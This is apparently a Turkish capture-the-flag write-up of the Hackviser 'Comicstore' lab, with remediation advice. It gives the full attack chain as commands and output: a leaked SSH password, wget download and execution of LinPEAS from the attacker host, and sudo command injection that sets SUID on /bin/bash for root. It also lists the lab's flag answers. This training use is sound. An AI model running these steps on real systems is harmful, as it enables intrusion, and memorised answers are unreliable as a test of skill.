# Comicstore Penetrasyon Testi Raporu

---

## Yönetici Özeti

Bu rapor, `comicstore.hv` (172.20.14.166) adresinde barındırılan hedef sistem üzerinde gerçekleştirilen kapsamlı güvenlik değerlendirmesini belgelemektedir. Değerlendirme, başlangıç keşif aşamasından root seviyesi erişime kadar sistemin tamamen ele geçirilmesine olanak sağlayan kritik güvenlik açıklarını tespit etmiştir.

**Ana Bulgular:**
- **Yüksek:** Web dizininde hassas notlar ve kimlik bilgilerinin düz metin olarak açığa çıkması
- **Kritik:** Bash scriptinde komut enjeksiyonu güvenlik açığı
- **Kritik:** Sudo yanlış yapılandırması (NOPASSWD) ile yetki yükseltme
- **Yüksek:** Root dizininde hassas finansal verilerin saklanması

Sömürü zinciri web tabanlı bilgi ifşasından SSH erişimi, komut enjeksiyonu ile yetki yükseltme ve nihayetinde root erişimine ilerlemiştir. Kullanıcı kimlik bilgileri, hassas notlar ve dolandırıcılık hedef listesi dahil kritik veriler başarıyla elde edilmiştir.

---

## 1. Numaralandırma

### 1.1 İlk Kurulum

Hedef domain, hosts dosyası düzenlenerek yerel ağ ortamına eşleştirildi:

```bash
sudo nano /etc/hosts
```

Aşağıdaki giriş eklendi:

```
172.20.14.166 comicstore.hv
```

### 1.2 Ağ Servisi Keşfi

İlk keşif aşaması, açıkta kalan saldırı yüzeylerini tespit etmek için Nmap ile kapsamlı ağ servisi taraması ile başlatıldı:

```bash
nmap -sVC -oX nmap.xml -T4 172.20.14.166 > nmap.txt
```

**Tarama Sonuçları:**

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-23 15:24 +0300
Nmap scan report for comicstore.hv (172.20.14.166)
Host is up (0.073s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   256 f1:d3:3d:0e:44:58:c2:6e:7c:32:e2:9f:aa:d4:32:40 (ECDSA)
|_  256 10:6f:37:a1:79:c5:15:08:9c:23:44:ea:24:10:84:27 (ED25519)
80/tcp   open  http    Apache httpd 2.4.57 ((Debian))
| http-robots.txt: 1 disallowed entry
|_/wp-admin/
|_http-generator: WordPress 6.5.2
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: Comic Store
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.41 seconds
```

**Tespit Edilen Servisler:**

1. **SSH (Port 22):** OpenSSH 9.2p1 Debian - Güncel sürüm. Kimlik bilgisi edinimi koşuluna bağlı potansiyel giriş noktası.

2. **HTTP (Port 80):** Apache httpd 2.4.57 - WordPress 6.5.2 çalıştıran "Comic Store" web sitesi. robots.txt dosyasında `/wp-admin/` dizini ifşa edilmiş.

3. **MySQL (Port 3306):** MariaDB 10.3.23 veya daha eski - Yetkisiz erişim. Potansiyel veritabanı hedefi.

### 1.3 Web Uygulaması Keşfi

`http://comicstore.hv` adresinin incelenmesi, bir çizgi roman mağazası web sitesini ortaya çıkardı. İlk sayfada paylaşılan gönderilerin incelenmesi önemli bir kullanıcı adı keşfine yol açtı:

![Ana Sayfa](assets/index.png)

**Bulgu #1:** Potansiyel kullanıcı adı tespit edildi: `johnny`

Ana sayfada blog gönderilerini yayınlayan kullanıcı ismi "johnny" olarak görüldü. Bu, SSH kimlik doğrulaması için potansiyel bir kullanıcı adı teşkil etmektedir.

### 1.4 Dizin Keşfi

Web uygulama yapısını belirlemek için Gobuster ile dizin brute-force saldırısı gerçekleştirildi:

```bash
gobuster dir -u http://172.20.14.166 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

**Kritik Keşif:**

```
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.20.14.166
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
_notes               (Status: 301) [Size: 315] [--> http://172.20.14.166/_notes/]
admin                (Status: 302) [Size: 0] [--> http://comicstore.hv/wp-admin/]
dashboard            (Status: 302) [Size: 0] [--> http://comicstore.hv/wp-admin/]
favicon.ico          (Status: 302) [Size: 0] [--> http://comicstore.hv/wp-includes/images/w-logo-blue-white-bg.png]
feed                 (Status: 200) [Size: 21857]
index.php            (Status: 200) [Size: 28761]
javascript           (Status: 301) [Size: 319] [--> http://172.20.14.166/javascript/]
license.txt          (Status: 200) [Size: 19915]
```

**Bulgu #2:** Gizli `_notes` dizini keşfedildi

---

## 2. Bilgi İfşası: Hassas Notlar

### 2.1 _notes Dizininin İncelenmesi

`/_notes/` dizinine erişim sağlandığında, dizin listeleme etkinleştirilmiş olduğu görüldü:

![Notes Dizini](assets/notes.png)

Dizinde `_securepassword.txt` adlı şüpheli bir dosya tespit edildi. Dosyanın incelenmesi kritik kimlik bilgilerini ortaya çıkardı:

![Secure Passwords](assets/securepasswords.png)

**Dosya İçeriği:**

```
bl4z3
```

**Bulgu #3:** SSH şifresi tespit edildi: `bl4z3`

**Güvenlik Açığı Analizi:**

Bu bilgi ifşası aşağıdaki güvenlik kusurlarını içermektedir:
1. **Dizin Listeleme Etkin:** Web sunucusunda dizin listeleme kapatılmamış
2. **Düz Metin Kimlik Bilgisi:** Şifre şifreleme olmadan saklanmış
3. **Hassas Dosyalar Web Kök Dizininde:** Kimlik bilgileri web erişilebilir konumda
4. **Zayıf Dosya İsimlendirme:** `_securepassword.txt` dosyası kolayca tahmin edilebilir

Bu zafiyet **yüksek önem dereceli bilgi ifşası** güvenlik açığı teşkil etmektedir (CVSS Base Score: 7.5 - Yüksek).

---

## 3. İlk Erişim: SSH Kimlik Doğrulama

### 3.1 Kimlik Bilgisi Doğrulama

Web keşfi aracılığıyla elde edilen kimlik bilgileri ile SSH servisine karşı kimlik doğrulama girişiminde bulunuldu:

```bash
ssh johnny@172.20.14.166
```

**Kullanılan Kimlik Bilgileri:**
- **Kullanıcı Adı:** johnny
- **Şifre:** bl4z3

**Başarılı Kimlik Doğrulama:**

```
┌──(macallan㉿kali)-[~/Downloads/Hackviser/writeup/comicstore]
└─$ ssh johnny@172.20.14.166
johnny@172.20.14.166's password: bl4z3
Linux comicstore 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jan 23 09:46:41 2026 from 10.8.73.133
johnny@comicstore:~$ whoami
johnny
johnny@comicstore:~$ id
uid=1000(johnny) gid=1000(johnny) groups=1000(johnny)
```

**Sonuç:** `johnny` kullanıcısı olarak shell erişimi elde edildi ve hedef sistemde dayanak noktası kuruldu.

**Güvenlik Tespit Notları:**
1. **Kimlik Bilgisi Tekrar Kullanımı:** Web'den elde edilen şifre SSH için geçerliydi
2. **Çok Faktörlü Kimlik Doğrulama Yok:** SSH erişimi ikincil kimlik doğrulama mekanizmalarından yoksundu
3. **Zayıf Şifre Politikası:** `bl4z3` gibi basit şifrelere izin verilmesi

### 3.2 Sömürü Sonrası Keşif

Ele geçirilen kullanıcı bağlamında gerçekleştirilen ilk keşif, ev dizininin yapısını ortaya çıkardı:

```bash
johnny@comicstore:~$ ls -la
total 36
drwx------ 7 johnny johnny 4096 May  6  2024 .
drwxr-xr-x 3 root   root   4096 Jan 16  2024 ..
lrwxrwxrwx 1 johnny johnny    9 Mar  3  2024 .bash_history -> /dev/null
-rw-r--r-- 1 johnny johnny  220 Jan 16  2024 .bash_logout
-rw-r--r-- 1 johnny johnny 3526 Jan 16  2024 .bashrc
drwxr-xr-x 2 johnny johnny 4096 Feb 18  2024 Desktop
drwxr-xr-x 3 johnny johnny 4096 Feb 18  2024 Documents
drwxr-xr-x 2 johnny johnny 4096 Feb 18  2024 Music
drwxr-xr-x 2 johnny johnny 4096 Feb 18  2024 Public
drwxr-xr-x 2 johnny johnny 4096 Feb 18  2024 Videos
```

**Dikkat Çekici Detaylar:**
- `.bash_history` dosyası `/dev/null`'a sembolik link ile bağlanmış - Komut geçmişi gizlenmeye çalışılmış
- Standart kullanıcı dizin yapısı (Desktop, Documents, Music, vb.)

### 3.3 Documents Dizini Keşfi

İlerleyen keşif, `Documents` dizininde ilgi çekici bir alt dizin ortaya çıkardı:

```bash
johnny@comicstore:~$ cd Documents/
johnny@comicstore:~/Documents$ ls -la
total 12
drwxr-xr-x 3 johnny johnny 4096 Feb 18  2024 .
drwx------ 7 johnny johnny 4096 May  6  2024 ..
drwxr-xr-x 2 root   root   4096 May  2  2024 myc0ll3ct1on
```

**Bulgu #4:** Çizgi romanların tutulduğu dizin: `myc0ll3ct1on`

İlk bakışta `myc0ll3ct1on` dizininin `root` tarafından sahiplenildiği görülüyor, bu da içerisinde hassas dosyalar bulunabileceğini göstermektedir.

---

## 4. Yetki Yükseltme

### 4.1 LinPEAS ile Otomatik Numaralandırma

Yetki yükseltme vektörlerini belirlemek için LinPEAS (Linux Privilege Escalation Awesome Script) otomatik numaralandırma aracı dağıtıldı. LinPEAS şunları içeren kapsamlı güvenlik denetimleri gerçekleştirir:

- SUID/SGID binary tanımlaması
- Sudo yanlış yapılandırma analizi
- Cron job numaralandırması
- Yazılabilir dosya tespiti
- Kimlik bilgisi araması

Araç, saldırgan makinesinden aktarıldı:

```bash
# Saldırgan makinesi
python3 -m http.server 8080
```

```bash
# Hedef makine
cd /tmp
wget http://10.8.73.133:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

![LinPEAS Çalışması](assets/linpeas.png)

### 4.2 Kritik Bulgu: Sudo Yanlış Yapılandırması

LinPEAS çıktısı kritik bir yetki yükseltme vektörü ortaya çıkardı:

```
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
Matching Defaults entries for johnny on comicstore:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User johnny may run the following commands on comicstore:
    (root) NOPASSWD: /opt/.securebak/backup_mp3.sh
```

**Bulgu #5:** Sudo ile çalıştırılabilen script: `backup_mp3.sh`

**Teknik Analiz:**

`johnny` kullanıcısı, şifre doğrulaması olmadan `/opt/.securebak/backup_mp3.sh` scripti üzerinde sınırsız sudo erişimine sahipti. Bu script, yedekleme işlemleri için tasarlanmış ancak güvenlik açıkları içermektedir.

### 4.3 Script Analizi: Komut Enjeksiyonu

`backup_mp3.sh` betiğinin detaylı analizi yapıldı:

```bash
johnny@comicstore:/tmp$ cat /opt/.securebak/backup_mp3.sh
```

**Script İçeriği:**

```bash
#!/bin/bash

sudo find / -name "*.mp3" | sudo tee -a /run/media/johnny/BACKUP/backedup.txt

# archive file to keep track of files
input="/run/media/johnny/BACKUP/backedup.txt"

while getopts c: flag; do
  case "${flag}" in
    c) command=${OPTARG};;
  esac
done

backup_files="/home/johnny/Music/song*.mp3"

# backup location
dest="/run/media/johnny/BACKUP"

# archive filename.
hostname=$(hostname -s)
archive_file="$hostname-bak.tar.gz"

# print starting message
echo "Backing up $backup_files to $dest/$archive_file" && echo

# backing up the files
tar czf $dest/$archive_file $backup_files

# print ending message
echo && echo "Backup finished"

cmd=$($command) && echo $cmd
```

**Güvenlik Açığı Tespit:**

Scriptin kritik zayıf noktası son satırlarda bulunmaktadır:

```bash
while getopts c: flag; do
  case "${flag}" in
    c) command=${OPTARG};;  # 1. Kullanıcıdan -c parametresi ile bir komut alıyor
  esac
done

# ... (aradaki kodlar) ...

cmd=$($command) && echo $cmd  # 2. Aldığı komutu doğrudan çalıştırıyor!
```

**Sömürü Mekanizması:**

1. **Güvenli Olmayan Girdi İşleme:** Script, `-c` parametresiyle verilen girdiyi doğrudan `$command` değişkenine atar
2. **Komut Enjeksiyonu:** `$($command)` yapısı, değişkenin içeriğini shell komutu olarak çalıştırır
3. **Root Yetkileri:** Script `sudo` ile çalıştırıldığı için enjekte edilen komutlar root yetkisiyle çalışır
4. **Girdi Sanitizasyonu Yok:** Hiçbir girdi doğrulama veya filtreleme mekanizması bulunmamakta

Bu zafiyet, **kritik komut enjeksiyonu güvenlik açığı** teşkil etmektedir (CVSS Base Score: 9.8 - Kritik).

### 4.4 Sömürü: Root'a Yetki Yükseltme

#### Yöntem A: /bin/bash'e SUID Bit Eklemek (Önerilen)

En güvenilir yetki yükseltme yöntemi, `/bin/bash` binary'sine SUID biti eklemektir. Bu, bash'i kim çalıştırırsa çalıştırsın dosya sahibinin (root) yetkileriyle çalışmasını sağlar:

```bash
sudo /opt/.securebak/backup_mp3.sh -c "chmod +s /bin/bash"
```

SUID biti eklendikten sonra, ayrıcalıklı shell başlatılır:

```bash
/bin/bash -p
```

**Çalıştırma Sonuçları:**

```
johnny@comicstore:/tmp$ sudo /opt/.securebak/backup_mp3.sh -c "chmod +s /bin/bash"
tee: /run/media/johnny/BACKUP/backedup.txt: No such file or directory
Backing up /home/johnny/Music/song*.mp3 to /run/media/johnny/BACKUP/comicstore-bak.tar.gz

tar: Removing leading `/' from member names
tar: /home/johnny/Music/song*.mp3: Cannot stat: No such file or directory
tar (child): /run/media/johnny/BACKUP/comicstore-bak.tar.gz: Cannot open: No such file or directory
tar (child): Error is not recoverable: exiting now
tar: Child returned status 2
tar: Error is not recoverable: exiting now

Backup finished

johnny@comicstore:/tmp$ /bin/bash -p
bash-5.2# whoami
root
bash-5.2# id
uid=1000(johnny) gid=1000(johnny) euid=0(root) egid=0(root) groups=0(root),1000(johnny)
```

**Sonuç:** Root erişimi başarıyla elde edildi.

**Teknik Detaylar:**
- `-p` parametresi, bash'in SUID ile çağrıldığında yükseltilmiş yetkilerini düşürmesini engeller
- `euid=0(root)` efektif kullanıcı ID'sinin root olduğunu gösterir
- Script hataları (yedekleme dizini bulunamadı) sömürüyü engellemez

#### Yöntem B: Doğrudan Shell Açmak (Alternatif)

Alternatif yöntem olarak doğrudan bash çağrılabilir:

```bash
sudo /opt/.securebak/backup_mp3.sh -c "/bin/bash"
```

Ancak bu yöntem, scriptin komut tamamlama (command substitution) mekanizması nedeniyle kararsız olabilir veya donabilir.

---

## 5. Sömürü Sonrası ve Veri Toplama

### 5.1 Root Dizin Keşfi

Root erişimi kurulduğunda, daha önce erişilemeyen dizinler incelenebildi. `Documents/myc0ll3ct1on` dizini artık tam erişilebilirdi:

```bash
bash-5.2# cd /home/johnny/Documents/myc0ll3ct1on
bash-5.2# ls -la
total 49168
drwxr-xr-x 2 root   root       4096 May  2  2024 .
drwxr-xr-x 3 johnny johnny     4096 Feb 18  2024 ..
-rw-r--r-- 1 johnny johnny      226 Mar  3  2024 notetomyself.txt
-rw-r--r-- 1 johnny johnny 10485760 Feb 18  2024 NotSoRare.cba
-rw-r--r-- 1 johnny johnny 12582912 Feb 18  2024 Rare.cba
-rw------- 1 root   root        274 May  2  2024 scamlist.csv
-rw-r--r-- 1 johnny johnny 13631488 Feb 18  2024 SuperRare.cba
-rw-r--r-- 1 johnny johnny 13631488 Feb 18  2024 VeryRare.cba
```

**Keşfedilen Dosyalar:**
- **notetomyself.txt** - Kişisel not dosyası
- **NotSoRare.cba, Rare.cba, SuperRare.cba, VeryRare.cba** - Çizgi roman arşiv dosyaları
- **scamlist.csv** - Root yetkisiyle korunan hassas dosya

### 5.2 Hassas Veri Analizi: Dolandırıcılık Hedef Listesi

`scamlist.csv` dosyası root yetkilerine sahip olduğu için yalnızca root erişimi ile okunabilirdi. Dosyayı analiz etmek için saldırgan makinesine transfer edilmesi gerekiyordu.

**Dosya Transferi:**

Hedef sistemde HTTP sunucusu başlatıldı:

```bash
bash-5.2# python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Saldırgan makinesinde dosya indirildi:

```bash
┌──(macallan㉿kali)-[~/Downloads/Hackviser/writeup/comicstore]
└─$ wget http://172.20.14.166:8080/scamlist.csv
--2026-01-23 18:04:19--  http://172.20.14.166:8080/scamlist.csv
Connecting to 172.20.14.166:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 274 [text/csv]
Saving to: 'scamlist.csv'

scamlist.csv            100%[============================>]     274  --.-KB/s    in 0s

2026-01-23 18:04:19 (44.2 MB/s) - 'scamlist.csv' saved [274/274]
```

**Dosya İçeriği:**

![Scam List](assets/scamlist.png)

```csv
Name,Age,Email,Phone,Note
John Smith,45,jsmith@email.hv,555-0101,Easy target
Sarah Johnson,52,sjohnson@email.hv,555-0102,Wealthy widow
Michael Brown,38,mbrown@email.hv,555-0103,Tech illiterate
Emily Randolf,67,erandolf@email.hv,555-0104,This woman is rolling in money
```

**Bulgu #6:** Dolandırıcılık hedef listesi: 4 kişi tespit edildi

**Kritik Tespit:**

"This woman is rolling in money" notu ile **Emily Randolf** (67 yaşında) en yüksek öncelikli hedef olarak işaretlenmiş.

**Teknik Analiz:**

Bu dosya, aşağıdaki kötü niyetli faaliyetlerin kanıtını oluşturmaktadır:
1. **Dolandırıcılık Planlaması:** Potansiyel mağdurların sistematik listesi
2. **Kişisel Veri Toplama:** İsim, yaş, e-posta, telefon numarası içeren kişisel bilgiler
3. **Hedef Profilleme:** "Easy target", "Tech illiterate", "Rolling in money" gibi notlar hedef seçim kriterlerini gösteriyor
4. **Yaşlı Hedefleme:** Hedeflerin çoğunluğu 45+ yaş grubunda

Bu dosya, **organized dolandırıcılık operasyonunun** doğrudan kanıtı niteliğindedir ve kolluk kuvvetlerine bildirilmesi gerekmektedir.

---

## 6. Sonuç ve Düzeltme

### 6.1 Bulguların Özeti

Bu değerlendirme, çok aşamalı bir saldırı zinciri aracılığıyla Comicstore altyapısını başarıyla ele geçirdi:

1. **Web Bilgi İfşası:** `_notes` dizininde düz metin kimlik bilgilerinin açığa çıkması
2. **SSH Erişimi:** Açığa çıkan kimlik bilgileri ile sistem erişimi
3. **Sudo Yanlış Yapılandırması:** NOPASSWD ile backup_mp3.sh scriptine sudo erişimi
4. **Komut Enjeksiyonu:** Backup scriptinde güvenli olmayan girdi işleme
5. **Yetki Yükseltme:** SUID bash manipülasyonu ile root erişimi
6. **Hassas Veri Keşfi:** Dolandırıcılık hedef listesi ve finansal istihbarat

**Elde Edilen Bilgiler:**
- Kullanıcı adı: `johnny`
- SSH şifresi: `bl4z3`
- Çizgi roman koleksiyon dizini: `myc0ll3ct1on`
- Yetki yükseltme scripti: `backup_mp3.sh`
- En zengin hedef: `Emily Randolf`

### 6.2 Düzeltme Önerileri

**Kritik Öncelik:**

1. **Hassas Dosyaların Web Erişiminden Kaldırılması**
   - `_notes` dizinini ve içindeki tüm hassas dosyaları web kök dizininden kaldırın:
     ```bash
     rm -rf /var/www/html/_notes
     ```
   - Kimlik bilgilerini asla web erişilebilir dizinlerde saklamayın
   - Gerekirse, hassas dosyaları `/root` veya şifreli dizinlerde saklayın

2. **Apache Dizin Listeleme Devre Dışı Bırakma**
   - Apache yapılandırmasında dizin listelemeyi kapatın:
     ```apache
     <Directory /var/www/html>
         Options -Indexes
     </Directory>
     ```
   - Tüm dizinler için varsayılan olarak dizin listelemeyi engelleyin

3. **Sudo Yetki Ayrımı**
   - backup_mp3.sh için NOPASSWD sudo erişimini kaldırın:
     ```bash
     # /etc/sudoers dosyasından kaldırın:
     johnny ALL=(ALL) NOPASSWD: /opt/.securebak/backup_mp3.sh
     ```
   - Yedekleme işlemleri için ayrıcalıksız alternatif mekanizmalar uygulayın:
     - Systemd timer ile zamanlanmış yedekleme
     - Cron job ile otomatik yedekleme (root yetkisiyle)
     - Kullanıcı tarafından tetiklenen yedeklemeler için güvenli API

4. **Script Güvenlik Sertleştirmesi**
   - `backup_mp3.sh` scriptindeki komut enjeksiyonu güvenlik açığını düzeltin
   - Kullanıcı girdisini asla doğrudan shell komutuna geçirmeyin
   - Girdi sanitizasyonu ve validasyonu uygulayın:
     ```bash
     # YANLIŞ (mevcut kod):
     cmd=$($command) && echo $cmd

     # DOĞRU (güvenli alternatif):
     # Hiç kullanıcı girdiyle komut çalıştırmayın
     # Veya izin verilen komutları whitelist ile sınırlayın
     case "$command" in
       "status") echo "Backup status: OK" ;;
       "list") ls -lh "$dest" ;;
       *) echo "Invalid command" ;;
     esac
     ```

**Yüksek Öncelik:**

5. **Güçlü Kimlik Doğrulama Politikası**
   - Zayıf şifreleri engelleyen parola politikası uygulayın:
     ```bash
     # /etc/security/pwquality.conf
     minlen = 14
     dcredit = -1
     ucredit = -1
     ocredit = -1
     lcredit = -1
     ```
   - SSH key kimlik doğrulamasını zorunlu kılın:
     ```
     # /etc/ssh/sshd_config
     PasswordAuthentication no
     PubkeyAuthentication yes
     ```
   - Google Authenticator ile çok faktörlü kimlik doğrulama ekleyin

6. **Hassas Veri Koruma**
   - Kolluk kuvvetleri soruşturması için `scamlist.csv` dosyasını derhal güvence altına alın
   - Dosyada listelenen potansiyel mağdurları uyarın
   - Dolandırıcılık operasyonunu ilgili yetkililere bildirin
   - Hassas dosyalar için tam disk şifrelemesi (LUKS) dağıtın
   - Dosya erişimi için zorunlu erişim kontrolleri (SELinux/AppArmor) uygulayın

7. **Komut Geçmişi İzleme**
   - `.bash_history` dosyasının `/dev/null`'a yönlendirilmesini engelleyin:
     ```bash
     chattr +a /home/johnny/.bash_history
     ```
   - Tüm kullanıcı komutlarını merkezi log sunucusuna gönderin (`auditd`)

**Orta Öncelik:**

8. **Web Uygulaması Güvenlik Duvarı (WAF)**
   - ModSecurity veya benzer WAF çözümü dağıtın
   - Dizin traversal ve bilgi ifşası saldırılarını engelleyen kurallar ekleyin
   - robots.txt dosyasında admin dizinlerini gizlemeyin (saldırganlar için harita görevi görür)

9. **Güvenlik İzleme**
   - Saldırı tespit sistemi (IDS) dağıtın - örn. Fail2ban, OSSEC
   - Kritik dosyalarda dosya bütünlüğü izleme (FIM) uygulayın
   - Sudo komut çalıştırmalarını izleyin ve uyarı verin:
     ```
     Defaults logfile="/var/log/sudo.log"
     Defaults log_input, log_output
     ```

10. **Düzenli Güvenlik Denetimleri**
    - Üç ayda bir penetrasyon testi gerçekleştirin
    - Haftalık güvenlik açığı taramaları (Nessus, OpenVAS)
    - Kod inceleme ve script güvenlik denetimi

### 6.3 Güvenlik Etkileri

Tespit edilen güvenlik açıkları, yetkisiz aktörlerin şunları yapmasına izin veren tam bir güvenlik başarısızlığını temsil etmektedir:
- Hassas sistem kimlik bilgilerini çıkarma
- SSH erişimi ile sistem kontrolü elde etme
- Root seviyeli sistem ele geçirme
- Dolandırıcılık operasyonu kanıtlarına erişim
- Potansiyel mağdurların kişisel bilgilerini elde etme

Kötü niyetli aktörler tarafından sömürülmesini ve hedef bireylerin zarar görmesini önlemek için acil düzeltme ve olay müdahale aksiyonları gereklidir.

### 6.4 Uyumluluk İhlalleri

Tespit edilen zafiyetler ve kötü niyetli faaliyetler, aşağıdaki düzenlemelerin ihlalini oluşturmaktadır:
- **KVKK (Kişisel Verilerin Korunması Kanunu):** Yetersiz teknik ve organizasyonel güvenlik önlemleri
- **Bilgisayar Dolandırıcılığı ve İstismar Yasası:** Yetkisiz erişim ve dolandırıcılık planlaması
- **GDPR Madde 32:** Uygun güvenlik seviyesinin sağlanmaması
- **PCI DSS Gereksinim 8.2:** Zayıf şifre politikaları

### 6.5 Olay Müdahale Aksiyonları

**Acil Adımlar:**

1. **Kolluk Kuvvetlerine Bildirim**
   - `scamlist.csv` dosyasını ve tüm ilgili kanıtları yasal mercilere iletin
   - Siber Suçlarla Mücadele Daire Başkanlığı ile koordinasyon sağlayın
   - Adli bilişim uzmanları ile işbirliği yapın

2. **Mağdur Bilgilendirme**
   - John Smith, Sarah Johnson, Michael Brown ve Emily Randolf'u derhal uyarın
   - Potansiyel dolandırıcılık girişimleri hakkında bilgilendirin
   - Yerel polis birimleriyle koordine edin

3. **Sistem Güvenlik Sertleştirme**
   - Tüm kullanıcı şifrelerini derhal değiştirin
   - `johnny` hesabını askıya alın ve detaylı inceleme yapın
   - Tüm script dosyalarını güvenlik açıkları açısından denetleyin
   - SSH erişim loglarını analiz edin (geçmiş unauthorized erişim tespiti için)

4. **Adli İnceleme**
   - Tam disk imajı alın (kanıt saklama)
   - Tüm log dosyalarını yedekleyin
   - Dolandırıcılık operasyonunun kapsamını belirleyin
   - Sistem üzerinde başka kötü niyetli aktivite kanıtı arayın

---

## 7. Komut Referansı

### Keşif Komutları
```bash
# Host yapılandırması
echo 172.20.14.166 comicstore.hv >> /etc/hosts

# İlk ağ taraması
nmap -sVC -oX nmap.xml -T4 172.20.14.166 > nmap.txt

# Dizin brute-force
gobuster dir -u http://172.20.14.166 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

### İstismar Komutları
```bash
# SSH kimlik doğrulama
ssh johnny@172.20.14.166
# Şifre: bl4z3

# LinPEAS aktarımı
python3 -m http.server 8080
wget http://10.8.73.133:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### Yetki Yükseltme Komutları
```bash
# Sudo kontrol
sudo -l

# Backup script analizi
cat /opt/.securebak/backup_mp3.sh

# SUID yetki yükseltme
sudo /opt/.securebak/backup_mp3.sh -c "chmod +s /bin/bash"
/bin/bash -p
```

### Sömürü Sonrası Komutları
```bash
# Root dizin keşfi
cd /home/johnny/Documents/myc0ll3ct1on
ls -la

# Dosya transferi
python3 -m http.server 8080
wget http://172.20.14.166:8080/scamlist.csv
```

---

## 8. Gösterge ve Bayraklar (Flags)

**Soru 1:** Potansiyel kullanıcı adı ne olabilir?
**Cevap:** `johnny`
**Konum:** Web sitesi ana sayfası - blog yazarı

**Soru 2:** Görünüşe göre yönetici kendisi için bir not bırakmış. Parola nedir?
**Cevap:** `bl4z3`
**Konum:** `http://comicstore.hv/_notes/_securepassword.txt`

**Soru 3:** Çizgi romanların tutulduğu dizinin adı nedir?
**Cevap:** `myc0ll3ct1on`
**Konum:** `/home/johnny/Documents/myc0ll3ct1on`

**Soru 4:** Mp3 dosyalarını yedeklemek için kullanılan scriptin adı nedir?
**Cevap:** `backup_mp3.sh`
**Konum:** `/opt/.securebak/backup_mp3.sh`

**Soru 5:** Scamlist.csv dosyasındaki en zengin kişinin adı nedir?
**Cevap:** `Emily Randolf`
**Konum:** `/home/johnny/Documents/myc0ll3ct1on/scamlist.csv`

---

**Rapor Oluşturulma Tarihi:** 2026-01-23

**Değerlendirme Türü:** Bayrak Ele Geçirme (CTF) Güvenlik Egzersizi

**Hedef Sistem:** Comicstore (comicstore.hv)

**Makine:** https://app.hackviser.com/scenarios/comicstore

**MacallanTheRoot**: https://github.com/MacallanTheRoot
